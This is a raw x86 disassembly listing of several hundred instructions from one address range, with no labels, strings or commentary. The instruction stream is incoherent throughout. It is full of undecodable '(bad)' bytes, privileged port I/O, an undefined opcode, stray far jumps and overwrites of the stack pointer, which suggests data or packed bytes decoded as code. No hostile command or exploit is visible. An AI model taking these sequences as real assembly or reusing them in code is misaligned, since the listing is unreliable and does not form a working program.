  431202:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431209:	or     BYTE PTR [ebx],dh
  43120b:	dec    ecx
  43120c:	lea    eax,[ebx]
  43120e:	xor    eax,0x18fc0fc7
  431213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431214:	repz clc 
  431216:	add    eax,DWORD PTR [ebp+0x46]
  431219:	prefetcht0 BYTE PTR [ecx-0x2]
  43121d:	xor    eax,0x7c60872
  431222:	mov    esp,0xbd32c69b
  431227:	pop    esi
  431228:	mov    cl,0xbe
  43122b:	or     al,0xc6
  43122d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431234:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43123b:	add    dh,al
  43123d:	mov    eax,ebx
  43123f:	xor    DWORD PTR [ebx],0x35008dbc
  431245:	mov    ecx,DWORD PTR [edi]
  431247:	sbb    al,0x18
  431249:	inc    ebp
  43124a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431251:	clc    
  431252:	(bad)  
  431253:	xor    DWORD PTR [edx-0x64],esi
  431256:	lea    ecx,[ecx+0x45ffe838]
  43125c:	mov    ecx,ebx
  43125e:	fadd   st,st(6)
  431260:	dec    ebp
  431261:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431267:	out    0x1,eax
  431269:	inc    ebp
  43126a:	lea    ebp,ds:0xc8ffc6ff
  431270:	enter  0xa33,0xc6
  431274:	push   ebp
  431275:	leave  
  431276:	(bad)  
  431277:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43127d:	add    BYTE PTR [ebp+0x44],al
  431280:	mov    eax,esp
  431282:	mov    WORD PTR [esi+0x46398300],?
  431288:	psubusw mm4,QWORD PTR [esi-0x78]
  43128c:	add    BYTE PTR [ebx-0x1303f975],al
  431292:	add    BYTE PTR [ebp+0x1],0xeb
  431296:	add    BYTE PTR [ebp+0x38],al
  431299:	in     eax,dx
  43129a:	inc    ebp
  43129b:	inc    ebp
  43129c:	mov    ebx,ebx
  43129e:	add    BYTE PTR [ebp+0x0],0xec
  4312a2:	mov    DWORD PTR [ebp-0x41],eax
  4312a5:	sub    eax,0x2c00454e
  4312aa:	ins    DWORD PTR es:[edi],dx
  4312ab:	inc    ebp
  4312ac:	add    BYTE PTR [esi+0x66],bh
  4312af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312c0:	dec    edi
  4312c1:	pop    es
  4312c2:	add    ah,ch
  4312c4:	mov    DWORD PTR [ebp+0x68],eax
  4312c7:	in     eax,dx
  4312c8:	inc    DWORD PTR [ebp-0x7d]
  4312cb:	out    0xc0,al
  4312cd:	inc    ebp
  4312ce:	mov    edx,esp
  4312d0:	push   0x45
  4312d2:	(bad)  
  4312d3:	jmp    0xdf925890
  4312d8:	add    BYTE PTR [ebp-0x77],al
  4312db:	out    dx,al
  4312dc:	ins    BYTE PTR es:[edi],dx
  4312dd:	inc    ebp
  4312de:	jmp    edi
  4312e0:	add    DWORD PTR [ebp-0x14],0x7e
  4312e4:	mov    esi,esi
  4312e6:	outs   dx,BYTE PTR ds:[esi]
  4312e7:	inc    esp
  4312e8:	(bad)  
  4312e9:	mov    esp,0x8341b68d
  4312ee:	mov    DWORD PTR [esi+0x70],eax
  4312f1:	fcos   
  4312f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4312f9:	in     al,dx
  4312fa:	jb     0x431281
  4312fc:	(bad)  
  4312fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431303:	mov    edi,edi
  431305:	fdivr  st,st(7)
  431307:	out    dx,eax
  431308:	rcl    BYTE PTR [ebx],0x66
  43130b:	mov    DWORD PTR [ebp-0xc70075],eax
  431311:	(bad)  
  431312:	std    
  431313:	cmp    eax,DWORD PTR [eax]
  431315:	jne    0x43137d
  431317:	mov    DWORD PTR [ebp-0xba0048],eax
  43131d:	in     al,dx
  43131e:	outs   dx,BYTE PTR ds:[esi]
  43131f:	pushf  
  431320:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431326:	inc    DWORD PTR [ecx]
  431328:	inc    DWORD PTR [eax]
  43132a:	jae    0x431364
  43132c:	add    BYTE PTR [ebp+0x850266],al
  431332:	inc    DWORD PTR [ebp-0x1]
  431335:	mov    eax,eax
  431337:	jl     0x43139f
  431339:	add    BYTE PTR [ebp-0x740077],al
  43133f:	cld    
  431340:	dec    eax
  431341:	add    BYTE PTR [eax],0x1
  431344:	data16 add BYTE PTR [ebp+0x38],al
  431348:	mov    eax,0x47c2
  43134d:	mov    eax,0x824f89
  431352:	inc    edi
  431353:	mov    DWORD PTR [edx+0x64],ebp
  431356:	inc    WORD PTR [ebp-0x75]
  43135a:	(bad)  
  43135b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431362:	inc    ebp
  431363:	jge    0x431344
  431365:	add    bh,ah
  431367:	lea    ax,[ebp-0x750030]
  43136e:	add    al,0x46
  431371:	jmp    0x40ff:0x8885
  431377:	push   DWORD PTR [ebp+0x52]
  43137a:	lea    eax,[eax]
  43137c:	shl    BYTE PTR [esi-0x7b],1
  43137f:	test   esi,edi
  431381:	(bad)  
  431382:	(bad)  
  431383:	inc    DWORD PTR [ebp-0x990140]
  431389:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43138f:	inc    edi
  431390:	push   ecx
  431391:	xor    ax,WORD PTR [ebp-0x8d0045]
  431398:	add    al,al
  43139a:	ret    
  43139b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313a2:	push   eax
  4313a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313aa:	add    BYTE PTR [ebx-0x764f8839],al
  4313b0:	push   DWORD PTR [esi+0x1]
  4313b3:	inc    DWORD PTR [eax]
  4313b5:	mov    eax,0xff99ff
  4313ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313c0:	jne    0x43137a
  4313c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313cc:	mov    ecx,0xd74fb8
  4313d1:	add    cl,al
  4313d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313e0:	(bad)  
  4313e1:	push   ebp
  4313e3:	mov    eax,0x8c2789
  4313e8:	ret    0x6689
  4313eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4313ef:	add    bh,ah
  4313f1:	mov    WORD PTR [ebp-0x70],ax
  4313f5:	(bad)  
  4313f6:	ret    0x667d
  4313f9:	or     BYTE PTR [ebp-0x77],dl
  4313fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431403:	loop   0x43138e
  431405:	(bad)  
  431406:	xchg   esi,eax
  431407:	aam    0xcf
  431409:	out    dx,al
  43140a:	mov    DWORD PTR [esi-0x68],edi
  43140d:	inc    ebp
  43140e:	dec    edx
  43140f:	pop    ecx
  431410:	mov    edx,DWORD PTR [eax]
  431412:	repnz push bp
  431415:	or     BYTE PTR [ebx+0x55106638],0x49
  43141c:	(bad)  
  43141d:	repnz xor eax,0xa0898945
  431423:	mov    ah,0x89
  431425:	jmp    DWORD PTR [edx+0x66b0418d]
  43142b:	inc    DWORD PTR [ebp+0x50]
  43142e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431432:	mov    DWORD PTR [eax],ecx
  431434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431435:	pop    es
  431436:	inc    ecx
  431437:	(bad)  
  431438:	data16 fwait
  43143a:	inc    ebp
  43143b:	xor    ah,BYTE PTR [esi+0x3]
  43143e:	dec    ebp
  43143f:	push   eax
  431440:	inc    bp
  431442:	jge    0x4313c7
  431444:	mov    esp,DWORD PTR [esi-0x18]
  431447:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43144d:	add    DWORD PTR [ebx],esi
  43144f:	add    BYTE PTR [ebx],al
  431451:	test   DWORD PTR [ebx],esi
  431453:	(bad)  
  431454:	inc    WORD PTR [ebp+0x0]
  431458:	mov    eax,DWORD PTR [eax]
  43145a:	call   0x8898cb8f
  43145f:	mov    esi,eax
  431461:	clc    
  431462:	ret    
  431463:	rol    cl,0xa
  431466:	mov    DWORD PTR ds:0x7c0ec88,esi
  43146c:	mov    edx,edi
  43146e:	pushf  
  43146f:	pop    es
  431470:	jmp    FWORD PTR [edx+0x66]
  431473:	add    BYTE PTR [ebp-0x990175],al
  431479:	inc    ebp
  43147a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431480:	push   ebp
  431481:	mov    edi,eax
  431483:	mov    dh,BYTE PTR [eax+0x266ff51]
  431489:	push   ebp
  43148a:	add    BYTE PTR [ebx-0x764b0777],al
  431490:	dec    DWORD PTR [esi+0x661851e8]
  431496:	add    BYTE PTR [ebp-0x7b],dl
  431499:	cmp    esi,0xfffffffb
  43149c:	dec    DWORD PTR [ecx+0x51fe9285]
  4314a2:	jmp    DWORD PTR [esi-0x75]
  4314a5:	push   ebp
  4314a6:	hlt    
  4314a7:	data16 (bad) 
  4314a9:	dec    ebp
  4314aa:	ret    
  4314ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314b1:	lea    edx,[eax-0x1]
  4314b4:	jne    0x431487
  4314b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314bc:	dec    BYTE PTR [ecx+0x51559eff]
  4314c2:	mov    DWORD PTR [esi-0x4c],esp
  4314c5:	push   ebp
  4314c6:	jmp    DWORD PTR [esi-0x18]
  4314c9:	inc    ebp
  4314ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314d0:	(bad)  
  4314d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314d2:	inc    eax
  4314d4:	test   DWORD PTR [esi-0x2],esp
  4314d7:	inc    ebp
  4314d8:	dec    DWORD PTR [ebp-0x760bde75]
  4314de:	(bad)  
  4314df:	test   al,0xc3
  4314e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314e7:	lods   al,BYTE PTR ds:[esi]
  4314e8:	push   eax
  4314e9:	inc    ebp
  4314ea:	jne    0x4314fb
  4314ec:	dec    DWORD PTR [ebp+0x8]
  4314ef:	mov    ecx,DWORD PTR [ebx]
  4314f1:	sbb    al,0x0
  4314f3:	(bad)  
  4314f4:	mov    eax,0xc14fc3
  4314f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4314ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431503:	xor    eax,DWORD PTR [eax]
  431505:	add    eax,edi
  431507:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43150d:	xor    edi,DWORD PTR [eax+0x854f66]
  431513:	dec    BYTE PTR [ecx-0x76bb01]
  431519:	mov    BYTE PTR [ebx-0x76724001],al
  43151f:	pushf  
  431520:	inc    esi
  431521:	(bad)  
  431522:	dec    DWORD PTR [ebp-0x7abe6373]
  431528:	sar    esi,0x89
  43152b:	dec    DWORD PTR [eax+0x0]
  43152e:	inc    DWORD PTR [eax]
  431530:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431537:	xlat   BYTE PTR ds:[ebx]
  431538:	dec    edx
  431539:	add    bh,bh
  43153b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431541:	lea    esp,[esi-0x50]
  431544:	(bad)  
  431545:	(bad)  
  431546:	call   DWORD PTR [eax-0x1]
  431549:	inc    ebp
  43154a:	rdpmc  
  43154c:	add    BYTE PTR [ebx],al
  43154e:	push   ax
  431550:	lea    eax,[ebp-0x1]
  431556:	js     0x431557
  431558:	add    al,bh
  43155a:	push   bp
  43155c:	lea    ecx,[ebp-0x7701]
  431562:	fmul   DWORD PTR [ebp-0x7a997800]
  431568:	(bad)  
  431569:	(bad)  
  43156a:	(bad)  
  43156b:	(bad)  
  43156c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431572:	dec    eax
  431573:	mov    eax,0x8d8dffff
  431578:	mov    al,0xb0
  43157a:	(bad)  
  43157b:	call   DWORD PTR [ecx+0x50]
  43157e:	dec    ebp
  43157f:	inc    ebp
  431580:	mov    esi,0x7030833
  431585:	push   eax
  431586:	into   
  431587:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43158d:	call   DWORD PTR [ecx-0x8]
  431590:	lea    edx,[ebp-0x1]
  431593:	jmp    0x761797
  431598:	inc    eax
  431599:	jnp    0x431528
  43159b:	add    dh,bh
  43159d:	inc    WORD PTR [ebp-0x8a00b0]
  4315a4:	mov    edx,eax
  4315a6:	inc    esp
  4315a7:	add    bh,bh
  4315a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315af:	dec    DWORD PTR [ebx-0x7f820301]
  4315b5:	add    BYTE PTR [ecx],al
  4315b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4315be:	inc    eax
  4315c0:	(bad)  
  4315c1:	dec    si
  4315c3:	test   edi,edi
  4315c5:	(bad)  
  4315c6:	cmp    edi,edi
  4315c8:	add    ecx,DWORD PTR [edi-0x39]
  4315cb:	mov    edx,DWORD PTR [edx+0x66]
  4315ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4315d4:	mov    eax,0x66ff8b5e
  4315da:	jmp    0xb4ff:0xc7ff3895
  4315e1:	push   ecx
  4315e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315e8:	call   DWORD PTR [esi-0x1]
  4315eb:	dec    DWORD PTR [eax]
  4315ed:	mov    ecx,0x805ff
  4315f2:	inc    ebp
  4315f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4315f9:	mov    ecx,0x35784
  4315fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431604:	inc    ebp
  431605:	mov    ecx,0x9c6131
  43160a:	(bad)  
  43160b:	mov    eax,ebx
  43160d:	pop    esp
  43160e:	test   edi,edi
  431610:	clc    
  431611:	lea    eax,[ebp-0x24]
  431614:	cmp    eax,0xc7fe9c8d
  431619:	push   eax
  43161b:	lea    eax,[ebp+0x45fff8fe]
  431621:	mov    esi,DWORD PTR [ecx]
  431623:	hlt    
  431624:	lahf   
  431625:	push   esp
  431626:	mov    edx,DWORD PTR [ecx-0x4]
  431629:	xor    eax,DWORD PTR [eax+0x7201bb]
  43162f:	add    BYTE PTR [ebp-0x35],al
  431632:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431638:	mov    edx,DWORD PTR [ecx-0x74]
  43163b:	rol    BYTE PTR [eax],0x8d
  43163e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431642:	nop
  431643:	push   ecx
  431644:	add    bh,bh
  431646:	mov    esp,edi
  431648:	in     al,0x85
  43164a:	jge    0x43164a
  43164c:	test   edi,edi
  43164e:	jne    0x4315d5
  431650:	(bad)  
  431651:	(bad)  
  431652:	sbb    bh,bh
  431654:	push   ebp
  431655:	inc    ebp
  431656:	call   0xffdc10e6
  43165b:	add    BYTE PTR [ebp+0x66],al
  43165e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431664:	cmp    al,0x85
  431666:	ud0    eax,DWORD PTR [ebp-0x1]
  43166a:	test   DWORD PTR [edi+0x74],ecx
  43166d:	dec    edi
  43166e:	inc    DWORD PTR [ebp-0x530004]
  431674:	dec    DWORD PTR [edi-0x75]
  431677:	dec    esi
  431678:	cld    
  431679:	test   DWORD PTR [eax+0xff01ff],eax
  43167f:	icebp  
  431680:	add    BYTE PTR [edi-0x3a],cl
  431683:	test   ebx,eax
  431685:	inc    BYTE PTR [ebp-0x1]
  431688:	jne    0x43168a
  43168a:	mov    eax,DWORD PTR [eax]
  43168c:	cld    
  43168d:	xor    BYTE PTR [ecx+0x500155],cl
  431693:	push   ebp
  431694:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43169a:	add    BYTE PTR [ebp+0x35e90f50],al
  4316a0:	add    al,BYTE PTR [eax]
  4316a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316a8:	add    ah,ch
  4316aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4316b0:	jmp    0xdf19a6
  4316b5:	(bad)  
  4316b6:	nop    ecx
  4316b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4316bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4316c2:	mov    eax,edi
  4316c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4316c7:	add    eax,0x45fef885
  4316cc:	dec    DWORD PTR [ebx+0x339445]
  4316d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316d8:	dec    DWORD PTR [ebx-0x460f0375]
  4316de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316df:	add    esi,edi
  4316e1:	add    bh,bh
  4316e3:	rdpmc  
  4316e5:	add    BYTE PTR [ebx],0x1
  4316e8:	mov    DWORD PTR [eax],eax
  4316ea:	add    al,0x45
  4316ec:	dec    DWORD PTR [ecx-0x360b3373]
  4316f2:	dec    DWORD PTR [esi]
  4316f4:	push   eax
  4316f5:	jne    0x43173c
  4316f7:	mov    esi,DWORD PTR [ebx]
  4316f9:	cld    
  4316fa:	add    esp,ecx
  4316fc:	push   eax
  4316fd:	inc    DWORD PTR [ebp-0x75]
  431700:	add    eax,0x800e4
  431705:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43170b:	mov    DWORD PTR [ecx],eax
  43170d:	sbb    al,0x0
  43170f:	leave  
  431710:	test   DWORD PTR [edi-0x2],eax
  431713:	jne    0x431714
  431715:	call   0xff44011a
  43171a:	xor    BYTE PTR [ebp+0x4d],al
  43171d:	mov    edi,edi
  43171f:	enter  0x8,0x4d
  431723:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431729:	mov    eax,DWORD PTR [eax]
  43172b:	cld    
  43172c:	add    DWORD PTR [ecx],ebx
  43172e:	inc    ebp
  43172f:	dec    ebp
  431730:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431736:	inc    eax
  431737:	dec    DWORD PTR [ecx-0x270375]
  43173d:	add    BYTE PTR [ebx-0x39d72701],cl
  431743:	xchg   ecx,eax
  431744:	ret    
  431745:	add    BYTE PTR [ebp-0x830075],al
  43174b:	add    BYTE PTR [ebp-0x75],al
  43174e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431754:	lea    edi,[edi-0xc]
  431757:	add    bh,bh
  431759:	mov    edx,DWORD PTR [eax-0x7b]
  43175c:	inc    ebp
  43175d:	rdpmc  
  43175f:	jne    0x431764
  431761:	add    BYTE PTR [eax-0x75],dl
  431764:	inc    ebp
  431765:	clc    
  431766:	add    eax,0x400009
  43176b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431771:	mov    eax,DWORD PTR [ecx]
  431773:	in     al,dx
  431774:	add    dh,al
  431776:	test   ebx,eax
  431778:	inc    BYTE PTR [ebp-0xff0001]
  43177e:	add    BYTE PTR [ebp-0x43],al
  431781:	cmp    esi,0xfffffff8
  431784:	(bad)  
  431785:	push   DWORD PTR [eax]
  431787:	add    BYTE PTR [ebp-0x3a],dl
  43178a:	test   ebx,eax
  43178c:	je     0x431713
  43178e:	mov    edi,edi
  431790:	sbb    al,0xff
  431792:	test   DWORD PTR gs:[eax],eax
  431795:	(bad)  
  431796:	js     0x431797
  431798:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43179e:	sub    eax,ebx
  4317a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317a6:	add    eax,DWORD PTR [eax]
  4317a8:	dec    ebp
  4317a9:	push   eax
  4317aa:	mov    al,BYTE PTR [ebp+0x1]
  4317ad:	mov    eax,DWORD PTR [ebp-0x68]
  4317b0:	mov    eax,DWORD PTR [eax]
  4317b2:	sbb    bh,al
  4317b4:	or     ah,dh
  4317b6:	dec    ebp
  4317b7:	inc    DWORD PTR [eax+0x4]
  4317ba:	push   ecx
  4317bb:	add    BYTE PTR [edx-0x1],dh
  4317be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317d4:	push   ecx
  4317d5:	cmp    BYTE PTR [ebx],al
  4317d7:	inc    ebp
  4317d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317de:	(bad)  
  4317df:	(bad)  
  4317e0:	in     al,0xff
  4317e2:	add    BYTE PTR [ebp+0x0],al
  4317e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317eb:	add    al,bh
  4317ed:	(bad)  
  4317ee:	jmp    0x8d85:0x74b0558d
  4317f5:	dec    DWORD PTR [eax]
  4317f7:	call   DWORD PTR [ebp-0x7b]
  4317fa:	mov    edi,esi
  4317fc:	lock call DWORD PTR [ebp-0x75]
  431800:	mov    esi,esp
  431802:	mov    ah,0xc6
  431804:	mov    bh,0xc3
  431806:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43180c:	add    DWORD PTR [eax],0x450050ff
  431812:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431818:	inc    edi
  43181a:	push   esp
  43181c:	jmp    0xcd00:0x650481ff
  431823:	mov    DWORD PTR [ebx],esi
  431825:	clc    
  431826:	cmp    edi,0xff9cff3c
  43182c:	jne    0x431836
  43182e:	mov    eax,eax
  431830:	add    esi,DWORD PTR [eax]
  431832:	int3   
  431833:	inc    ebp
  431834:	cmp    al,0x83
  431836:	add    BYTE PTR [eax],bl
  431838:	adc    DWORD PTR [ebx+0x768b5055],eax
  43183e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431844:	mov    edi,eax
  431846:	cmp    BYTE PTR [ebp+0x45],cl
  431849:	jmp    0x4317d6
  43184b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43184e:	inc    ebp
  43184f:	or     al,0x2
  431851:	dec    DWORD PTR [ebp+0x18]
  431854:	jne    0x4318ab
  431856:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43185c:	mov    edi,DWORD PTR [ebx]
  43185e:	in     al,0x50
  431860:	xchg   ecx,eax
  431861:	jmp    0x3436766
  431866:	adc    al,0x8b
  431868:	inc    ebp
  431869:	mov    al,ds:0x8b04008b
  43186e:	push   ebp
  43186f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431875:	push   ebp
  431876:	test   DWORD PTR [ebx-0x2800d701],ecx
  43187c:	inc    ebp
  43187d:	dec    ebp
  43187e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431884:	mov    DWORD PTR [eax],0xe9ff00f4
  43188a:	add    al,0x0
  43188c:	add    BYTE PTR [eax],al
  43188e:	mov    eax,edx
  431890:	push   eax
  431891:	rol    DWORD PTR [ebp-0xf0177],1
  431897:	bound  eax,QWORD PTR [ebp+0x50]
  43189a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318a6:	mov    al,0xf
  4318a8:	test   DWORD PTR [edx],edx
  4318aa:	call   DWORD PTR [ebp-0x7a0001]
  4318b0:	(bad)  
  4318b1:	loop   0x4318b2
  4318b3:	jnp    0xc6990cb9
  4318b9:	mov    eax,ebx
  4318bb:	cmp    al,0x8b
  4318bd:	(bad)  
  4318be:	cld    
  4318bf:	shr    esi,0xc
  4318c2:	add    dl,al
  4318c4:	push   eax
  4318c5:	lea    eax,[ebp-0x1]
  4318c8:	mov    edx,esi
  4318ca:	cwde   
  4318cb:	cli    
  4318cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318d2:	or     BYTE PTR [eax],cl
  4318d4:	inc    ebp
  4318d5:	dec    ebp
  4318d6:	inc    DWORD PTR [ebx+0x74803914]
  4318dc:	add    DWORD PTR [ebx+0x451800],ecx
  4318e2:	call   DWORD PTR [eax+edx*1]
  4318e5:	add    ecx,DWORD PTR [ebp-0x34]
  4318e8:	push   edi
  4318e9:	adc    al,0x8
  4318eb:	mov    edx,DWORD PTR [ebp-0x14]
  4318ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4318f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4318f5:	inc    DWORD PTR [eax+esi*8]
  4318f8:	inc    ebp
  4318f9:	stos   BYTE PTR es:[edi],al
  4318fa:	mov    edx,DWORD PTR [ebp-0x4]
  4318fd:	add    DWORD PTR [ebp-0x1c],eax
  431900:	mov    edx,DWORD PTR [ebp-0x70]
  431903:	cmp    eax,DWORD PTR [eax]
  431905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431906:	mov    eax,DWORD PTR [eax]
  431908:	cld    
  431909:	jae    0x43188b
  43190b:	add    eax,DWORD PTR [ecx]
  43190d:	clc    
  43190e:	add    BYTE PTR [eax+0x30],dl
  431911:	mov    DWORD PTR [ecx],esi
  431913:	clc    
  431914:	pop    ds
  431915:	inc    ebp
  431916:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43191c:	(bad)  
  43191d:	push   DWORD PTR [edi]
  43191f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431925:	(bad)  
  431926:	jae    0x431927
  431928:	mov    eax,DWORD PTR [ebp-0x740175]
  43192e:	sub    eax,DWORD PTR [eax]
  431930:	add    eax,DWORD PTR [eax]
  431932:	mov    DWORD PTR [ecx+0x5f],eax
  431935:	mov    DWORD PTR [ebx-0x4],ebx
  431938:	ret    0xff
  43193b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431941:	ret    
  431942:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431948:	add    BYTE PTR [ebp-0x7d],al
  43194b:	mov    DWORD PTR [eax],eax
  43194d:	add    al,0x84
  43194f:	inc    DWORD PTR [ecx]
  431951:	lea    eax,[eax]
  431953:	hlt    
  431954:	sar    bh,cl
  431956:	test   BYTE PTR [eax+0x1],dl
  431959:	inc    ebp
  43195a:	add    BYTE PTR [ebx],dh
  43195c:	test   BYTE PTR [ebx],0x84
  43195f:	push   eax
  431960:	add    BYTE PTR [ebp+0x0],al
  431963:	add    eax,0x86
  431968:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43196e:	add    BYTE PTR [ecx],al
  431970:	add    BYTE PTR [eax],al
  431972:	mov    esi,0x550030
  431977:	mov    ecx,DWORD PTR [edi]
  431979:	cld    
  43197a:	fidiv  DWORD PTR [ebp+0x0]
  43197d:	mov    edi,DWORD PTR [ecx]
  43197f:	xor    BYTE PTR [eax+eax*1],0x84
  431983:	add    eax,DWORD PTR [eax]
  431985:	sbb    BYTE PTR [eax],al
  431987:	jne    0x43193a
  431989:	mov    eax,DWORD PTR [ecx]
  43198b:	sbb    BYTE PTR [eax],al
  43198d:	mov    DWORD PTR [ebp-0x1],esp
  431990:	add    BYTE PTR [eax+0x30e45ca],bh
  431996:	ret    0xb7fc
  431999:	dec    ebp
  43199a:	or     al,0x89
  43199c:	dec    ebp
  43199d:	cld    
  43199e:	cmovne ecx,DWORD PTR [eax-0x75]
  4319a2:	add    edi,esp
  4319a4:	seto   BYTE PTR [esi-0x72ffffff]
  4319ab:	inc    ebp
  4319ac:	adc    al,0x8b
  4319ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319b5:	cmp    DWORD PTR [edi+0x72],edx
  4319b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319be:	gs cmp al,0x0
  4319c1:	je     0x431999
  4319c3:	push   eax
  4319c4:	sar    BYTE PTR [eax],1
  4319c6:	mov    bh,0x3e
  4319c8:	push   cs
  4319c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319cf:	add    DWORD PTR [ecx+0x12],ebp
  4319d2:	dec    edx
  4319d3:	(bad)  
  4319d4:	mov    eax,edx
  4319d6:	in     al,dx
  4319d7:	adc    DWORD PTR [ecx],esi
  4319d9:	pop    esi
  4319da:	inc    ecx
  4319db:	leave  
  4319dc:	or     DWORD PTR [eax],ebx
  4319de:	gs push ebp
  4319e0:	add    ah,ch
  4319e2:	into   
  4319e3:	in     al,dx
  4319e4:	enter  0xb756,0xf0
  4319e8:	push   cs
  4319e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4319f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4319f9:	jnp    0x74439f01
  4319ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a05:	add    BYTE PTR [edi],cl
  431a07:	mov    edi,DWORD PTR [ecx-0x78]
  431a0a:	ltr    WORD PTR [ecx-0x7b]
  431a0e:	dec    DWORD PTR [edi]
  431a10:	clc    
  431a11:	out    0x45,eax
  431a13:	add    BYTE PTR [eax],cl
  431a15:	cmp    ebx,0xffffff8c
  431a18:	jge    0x431a1a
  431a1a:	jb     0x431a2c
  431a1c:	je     0x521a9c
  431a22:	pop    edx
  431a23:	push   esi
  431a24:	mov    ecx,DWORD PTR [edi]
  431a26:	in     al,dx
  431a27:	rol    DWORD PTR [ebp+0x0],1
  431a2a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a31:	cmp    DWORD PTR [ecx],0xfffffff0
  431a34:	hlt    
  431a35:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a3b:	(bad)  
  431a3d:	push   eax
  431a3e:	jns    0xb842febc
  431a44:	lock push cs
  431a46:	ror    edx,0x3
  431a49:	test   BYTE PTR [ecx+0x5500e800],cl
  431a4f:	dec    eax
  431a50:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a54:	(bad)  
  431a55:	mov    esi,0x7f33ff5f
  431a5a:	inc    eax
  431a5b:	test   DWORD PTR [edx],eax
  431a5d:	je     0x431a1f
  431a5f:	mov    ecx,ecx
  431a61:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a65:	and    eax,DWORD PTR [eax+0xf0103]
  431a6b:	jp     0x431a59
  431a6d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
